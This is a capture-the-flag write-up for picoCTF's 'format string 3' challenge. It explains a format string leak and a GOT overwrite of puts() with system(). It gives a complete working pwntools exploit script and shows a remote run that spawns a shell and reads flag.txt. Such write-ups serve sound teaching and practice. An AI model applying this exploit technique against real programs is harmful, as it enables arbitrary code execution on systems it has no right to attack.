# format string 3 #
 
## Overview ##

300 points

Category: [Binary Exploitation](../)

Tags: `#binaryexploitation #formatstring #infoleak #writewhatwhere #libc #got`

## Description ##

This program doesn't contain a win function. How can you win?

Download the binary here.

Download the source here.

Download libc here, download the interpreter here. Run the binary with these two files present in the same directory.

## Approach ##

Inspecting the provided `format-string-3.c` source file, we see no evidence of a flag file but references to `/bin/sh`, so we can assume our task is to spawn a shell to gain access to the file system to view the flag file.

The use of an input buffer directly within a `printf(buf);` call yields a format string vulnerability.

After printing the input buffer the challenge calls `puts(normal_string);` where `normal_string` is a global variable containing the string `/bin/sh`.

This suggests we must use the format string vulnerability as a 'write-what-where' primitive to modify the `puts()` Global Offset Table (GOT) entry to point to `system()` instead, invoking our shell.

Checking the binary security features:

    $ checksec format-string-3
    [*] 'picoCTF/format-string-3/format-string-3'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x3ff000)
        RUNPATH:  b'.'

`puts()` is called in the `hello()` function after `setup()` before we require it's use, so with 'Partial RELRO' would have already been dynamically linked lazily on first use, meaning it will already contain a valid libc address.

Conveniently `format-string-3` prints the address of `setvbuf()` within libc on execution. Running the challenge we can see the reported address changing each execution due to Address Space Layout Randomisation (ASLR):

    $ nc rhea.picoctf.net 52365
    Howdy gamers!
    Okay I'll be nice. Here's the address of setvbuf in libc: 0x75aa9e67b3f0

    $ nc rhea.picoctf.net 52365
    Howdy gamers!
    Okay I'll be nice. Here's the address of setvbuf in libc: 0x70210ee2b3f0

    $ nc rhea.picoctf.net 52365
    Howdy gamers!
    Okay I'll be nice. Here's the address of setvbuf in libc: 0x7628a439d3f0

Using `objdump` we can find the `puts()` GOT entry address, which was found to be `0x404018`, this will be our target address to rewrite to replace it with the address of `system()` :

    $ objdump -M intel -d format-string-3 > format-string-3.objdump.txt

    $ cat format-string-3.objdump.txt | grep puts
    0000000000401080 <puts@plt>:
      401084:	f2 ff 25 8d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f8d]        # 404018 <puts@GLIBC_2.2.5>
      40121d:	e8 5e fe ff ff       	call   401080 <puts@plt>
      4012f2:	e8 89 fd ff ff       	call   401080 <puts@plt>

Use the provided `libc` shared object to determine the offsets of the two functions of interest, these will be the offsets from the randomised `libc` base address ultimately:

    $ readelf -s libc.so.6 | grep system
      1511: 000000000004f760    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
    $ readelf -s libc.so.6 | grep setvbuf
      1300: 000000000007a3f0   608 FUNC    WEAK   DEFAULT   16 setvbuf@@GLIBC_2.2.5    

As the base address of `libc` is randomised, we will need to parse the output of `format-string-3` when it displays the location of `setvbuf()` to subtract it's offset (`0x07a3f0`) into `libc` to find the current base address.

Using a typical stack dumping info leak mechanism to locate `buf` on the stack, using a token that can be readily located, in this case the string `"AAAAAAAA"`, which we'll find in hexadecimal form as `0x4141414141414141`. The first instance (string representation) in the output is just our token being printed by `printf()` and not the contents of `buf`.

    $ echo $(python3 -c 'print("A"*8 + ".0x%016llx"*50)') | ./format-string-3 
    Howdy gamers!
    Okay I'll be nice. Here's the address of setvbuf in libc: 0x7771492973f0
    AAAAAAAA.0x00007771493f5963.0x00000000fbad208b.0x00007fff764d66d0.0x0000000000000001.
    0x0000000000000000.0x0000000000000000.0x0000000000000000.0x0000000000000000.
    0x0000000000000000.0x0000000000000000.0x0000000000000000.0x0000000000000000.
    0x0000000000000000.0x0000000000000000.0x0000000000000000.0x0000000000000000.
    0x0000000000000000.0x0000000000000000.0x0000000000000000.0x0000000000000000.
    0x0000000000000000.0x0000000000000000.0x0000000000000000.0x0000000000000000.
    0x0000000000000000.0x0000000000000000.0x0000000000000000.0x0000000000000000.
    0x0000000000000000.0x0000000000000000.0x0000000000000000.0x0000000000000000.
    0x0000000000000000.0x0000000000000000.0x0000000000000000.0x0000000000000000.
    0x0000000000000000.0x4141414141414141.0x6c3631302578302e.0x31302578302e786c.
    0x2578302e786c6c36.0x302e786c6c363130.0x786c6c3631302578.0x6c3631302578302e.
    0x31302578302e786c.0x2578302e786c6c36.0x302e786c6c363130.0x786c6c3631302578.
    0x6c3631302578302e.0x31302578302e786c
    /bin/sh

`buf` can be seen to start at what would be the 38'th argument to `printf()` had there been arguments to the call. We can double check our calculation by displaying the 38'th argument directly using the format string `%38$016llx`:

    $ echo $(python3 -c 'print("A"*8 + ".0x%38$016llx")') | ./format-string-3 
    Howdy gamers!
    Okay I'll be nice. Here's the address of setvbuf in libc: 0x707eeb20a3f0
    AAAAAAAA.0x4141414141414141
    /bin/sh

This will allow us to build up our write-what-where format string, knowing the location of `buf` and it's corresponding position in terms of `printf()` arguments.

Refer to the write-up for [format string 2](Binary%20Exploitation/format%20string%202/format%20string%202.md) for further details on the attack method and payload construction, as this utilises the same approach.

## Solution ##

The approach detailed above was implemented via a [pwntools](https://docs.pwntools.com/en/stable/) script to obtain the final solution.


```
#!/usr/bin/env python3

from pwn import *
import re

target_elf = ELF("./format-string-3")

# define offsets to LIBC functions from base address
LIBC_SETVBUF_OFS = 0x07a3f0
LIBC_SYSTEM_OFS  = 0x04f760
# define Global Offset Table (GOT) entry addresses
PUTS_GOT         = 0x404018

# gdb terminal configuration
#context.terminal = ["tmux", "splitw", "-h"]

# command line support for local, remote and gdb modes
if len(sys.argv) > 1:
  if "remote" in sys.argv:
    if len(sys.argv) > 3:
      target_proc = remote(sys.argv[2], sys.argv[3])
    else:
      print('usage: ./pwn-game.py remote <server> <port>')
      exit(1)
  elif "gdb" in sys.argv:
    target_proc = target_elf.process()
    gdb.attach(target_proc)
else:
  target_proc = target_elf.process()

# Address Space Layout Randomisation (ASLR) is enabled on the remote target, 
# hence we're required to make use of the information given (absolute address
# of setvbuf() in libc at runtime) to determine firstly the base address of 
# libc in the address space and then use this to calculate the address of 
# system() to patch the puts() GOT entry with system() address 

# read and skip first line: "Howdy gamers!"
target_proc.recvline()
# read and find the displayed libc address for setvbuf(), line is in the form:
# "Okay I'll be nice. Here's the address of setvbuf in libc: 0x7d8714ca33f0\n"
setvbuf_addr_line = target_proc.recvline()
setvbuf_addr = re.search("0x[0-9a-f]+", setvbuf_addr_line.decode("utf-8"))
if setvbuf_addr != None:
  # extract the hexadecimal address (excludes the "0x" prefix)
  ad = bytes(setvbuf_addr.group()[2::], "utf-8")
  # convert to an integer from the string representation of the base-16
  # (hexadecimal) address
  int_ad = int(ad, 16)
  # calculate libc base address by subtracting the offset of setvbuf()
  base = int_ad - LIBC_SETVBUF_OFS
  print("Calculated libc base address: " + hex(base))
  # calculate the address of system() using the known offset and base address
  libc_system_addr = base + LIBC_SYSTEM_OFS
  print("Calculated libc system() address: " + hex(libc_system_addr))

  # split re-writting of puts() GOT into two short words to reduce unneccessary
  # output required to generate the required characters written count
  high_short_word = ((libc_system_addr >> 16) & 0xFFFF)
  low_short_word  = (libc_system_addr & 0xFFFF)

  # construct the write to target address portion of the payload
  payload = b''
  # we must write the smallest of the low or high short words first
  if (high_short_word > low_short_word):
    payload += b'%' + bytes(str(low_short_word), 'ascii') + b'x%43$hn'
    payload += b'%' + bytes(str(high_short_word - low_short_word), 'ascii') + b'x%44$hn'
  else:
    payload += b'%' + bytes(str(high_short_word), 'ascii') + b'x%43$hn'
    payload += b'%' + bytes(str(low_short_word - high_short_word), 'ascii') + b'x%44$hn'
  # word align payload with padding to have fixed locations for the format specifier
  # arguments, regardless of write value string length (may vary with address variation)
  payload_len = len(payload)
  payload += b'.' * (40 - payload_len)
  # append the target write addresses to the payload in the correct order
  if (high_short_word > low_short_word):
    payload += p64(PUTS_GOT) + p64(PUTS_GOT + 2)
  else:
    payload += p64(PUTS_GOT + 2) + p64(PUTS_GOT)

  # save payload to file for analysis/debugging
  with open("payload.txt", "wb") as binary_file:
    binary_file.write(payload)

  # send to the payload to the target and wait for the shell to drop
  target_proc.sendline(payload)
else:
  print("setvbuf address not found!");

target_proc.interactive()
target_proc.wait()
``` 

Running the script generates a lot of output to construct the correct write values, but once successful the script goes interactive (our spawned shell) at which point we can list the contents of the file system and dump the contents of the `flag.txt` file.

    $./pwn-format-string-3.py remote rhea.picoctf.net 61378
    [*] '/picoCTF/format-string-3/format-string-3'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x3ff000)
        RUNPATH:  b'.'
    [+] Opening connection to rhea.picoctf.net on port 61378: Done
    Calculated libc base address: 0x7e93ddedd000
    Calculated libc system() address: 0x7e93ddf2c760
    [*] Switching to interactive mode

    ... (snip) ...

         fbad208b...............\x18@$ ls
    Makefile
    artifacts.tar.gz
    flag.txt
    format-string-3
    format-string-3.c
    ld-linux-x86-64.so.2
    libc.so.6
    metadata.json
    profile
    $ cat flag.txt
    picoCTF{...........redacted.............}

Where the actual flag value has been redacted for the purposes of this write up.
